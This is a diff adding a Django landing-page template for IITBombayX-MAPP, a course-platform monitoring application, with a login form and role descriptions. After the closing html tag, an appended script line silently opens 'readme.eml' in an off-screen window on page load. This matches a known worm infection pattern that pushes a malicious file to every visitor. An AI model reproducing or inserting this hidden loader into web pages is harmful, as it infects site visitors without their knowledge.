@@ -1,0 +1,189 @@
+{% load staticfiles %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <style>
+#footer {
+   position:absolute;
+   bottom:0;
+   width:100%;
+   height:110px;   /* Height of the footer */
+   background: #ffffff;
+}
+
+#container{
+   min-height:22%;
+   position:relative;
+}
+ </style>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>IITBombayX-MAPP</title>
+     <link rel="shortcut icon" href="{%static "ima/logo2.png" %}">
+     <link rel="icon" type="image/x-icon" href="/static/themes/iitbombayx-theme/images/favicon.22b053d5ddae.ico" />
+    <!-- Bootstrap Core CSS -->
+    <link href="{% static "css/bootstrap.min.css" %}" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="{% static "css/modern-business.css" %}" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="{% static "font-awesome/css/font-awesome.min.css" %}" rel="stylesheet" type="text/css">
+    
+</head>
+
+<body style="background-color:#060606;">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation" style="height:60px;">
+        <div class="container" style="height:60px;">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header" style="height:60px;">
+	<img src="{%static "ima/logo2.png" %}" width="150px" height="60px">  
+<span style="float:right;margin-left:420px">
+<form  action="" method="post" class="navbar-form navbar-right" role="form">
+                {% if next %}
+		<input type="hidden" name="next" value="{{ next }}" />
+		{% endif %}                         
+<div class="input-group">
+                            <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
+                            <input type="text" style="width: 200px;font-size:+1em" class="form-control" name="username" value="{{ username}}" placeholder=" User Name">                                        
+                        </div>
+
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
+                            <input id="password" style="width: 200px;font-size:+1em" type="password" class="form-control" name="password" value="" placeholder=" Password">                                        
+                        </div>
+
+                        <button type="submit" class="btn btn-primary" value="Log In">Login</button>
+                   </form>    
+</span>  
+      
+            </div>
+           
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Header Carousel -->
+    <header id="myCarousel" class="carousel slide">
+        
+        <!-- Wrapper for slides -->
+        <div class="carousel-inner">
+
+            <div class="item active">
+
+                <div class="fill" ><img src="{% static "ima/tap.jpg"  %}" width="1300" height="400"></div>
+
+            
+            </div>
+           
+            </div>
+        
+
+       
+    </header>
+
+    <!-- Page Content -->
+    <div class="container">
+
+        <!-- Marketing Icons Section -->
+        <div class="row">
+            <div class="col-lg-12">
+                <h1 class="page-header" style="color:#EBF8F5">
+                    Welcome to IITBombayX-MAPP<b style="font-size:20px;">(Monitoring Application)</b>
+                </h1>
+            </div>
+            <div class="col-md-4" style="height: 270px;">
+                <div class="panel panel-default" style="background-color:#292A32 ; height:100% ;">
+                    <div class="panel-heading" style="background-color:#2559A1 ; color:#0E0C0C">
+                        <h4><i class="fa fa-fw fa-user"></i><b> ADMIN</b></h4>
+                    </div>
+                    <div class="panel-body" style="color:#fff">
+                         <p align="justify"><ul><li>MAPP reports will help Administrator monitor the health of IITBombayX. </li><li>The user can monitor course-wise disk usage, view the registrations for different courses per day, view the enrollments of students under numerous courses and monitor the email server.</li></ul> </p>
+                       
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4" style="height: 270px;">
+                <div class="panel panel-default" style="background-color:#292A32 ;height:100%;">
+                    <div class="panel-heading" style="background-color:#2559A1; color:#0E0C0C">
+                        <h4><i class="fa fa-fw fa-user"></i><b>Program Manager</b></h4>
+                    </div>
+                    <div class="panel-body" style="color:#fff">
+                        <p align="justify"><ul><li>The program manager can check IITBombayX metrics at the partner institute level.</li>  <a href="ceopanel/index" style="float:left;"> <b>click here</b> </a></li></ul></p>
+                       
+                       
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4" style="height:270px;">
+                <div class="panel panel-default" style="background-color:#292A32;height:100%">
+                    <div class="panel-heading" style="background-color:#2559A1 ; color:#0E0C0C">
+                        <h4><i class="fa fa-fw fa-user"></i><b> FACULTY</b></h4>
+                    </div>
+                    <div class="panel-body" style="color:#fff">
+                      <p align="justify"><ul><liMAPP helps Faculty get regular updates on the performance of their students.</li> <li>They may take necessary action to improve the results by providing some extra study material based upon individual performances considering grades and attendance of their students.</li></ul></p>
+                       
+                    </div>
+                </div>
+            </div>
+        </div>
+<br><br>
+<div class="row">
+ <div class="col-md-4" style="height: 270px; margin-left:170px;">
+                <div class="panel panel-default" style="background-color:#292A32;height:100%">
+                    <div class="panel-heading" style="background-color:#2559A1; color:#0E0C0C">
+                        <h4><i class="fa fa-fw fa-user"></i><b>STUDENT</b></h4>
+                    </div>
+                    <div class="panel-body" style="color:#fff">
+                         <p align="justify"><ul><li>In MAPP, a student is provided with a snapshot of his attendance and grading performance</li><li>He may evaluate his own grades in different quizzes as well as compare his performance against the average performance.</li></ul></p>
+                   
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4" style="height: 270px;">
+                <div class="panel panel-default" style="background-color:#292A32;height:100%">
+                    <div class="panel-heading" style="background-color:#2559A1; color:#0E0C0C">
+                        <h4><i class="fa fa-fw fa-list-alt"></i><b> GENERAL INFORMATION</b></h4>
+                    </div>
+                    <div class="panel-body" style="color:#fff">
+                       <p align="justify"><ul><li>General information reports are open to all individuals who are interested in researching the usage of MOOCs.</li><li>The reports available are divided into different categories like those based on gender, level of education, age and geographical background.</li> </p><a href="generalinformation" style="float:left;"> <b>click here</b></a>
+                       <!-- <a href="#" class="btn btn-default">Learn More</a> -->
+                    </div>
+                </div>
+            </div>
+          
+        </div>
+</div>
+    <!-- jQuery -->
+    <script src="js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="js/bootstrap.min.js"></script>
+
+    <!-- Script to Activate the Carousel -->
+    <script>
+    $('.carousel').carousel({
+        interval: 5000 //changes the speed
+    })
+    </script>
+
+<div id="container" style="height:10%;">
+<div id="footer" style="height:70%;">
+<!-- Bharat MOOCs-->
+	<div style="float:left;margin-left:70px;"><img src="{%static "ima/logo2.png" %}" width="180px" height="85px"> </div>
+        <div style="margin-left:300px; margin-right:35px;margin-top:10px; width:800px ;"><p style="text-align:justify; color:black; "> IITBombayX Monitoring Application (MAPP) is an online application for tracking the IITBombayX deployment and provide quick snapshots of data which various users would be interested in monitoring. It aims to provide feedback to users and allow them to perform action based on the same.</p><div> 
+      </div>
+    </div></div>
+</body>
+
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
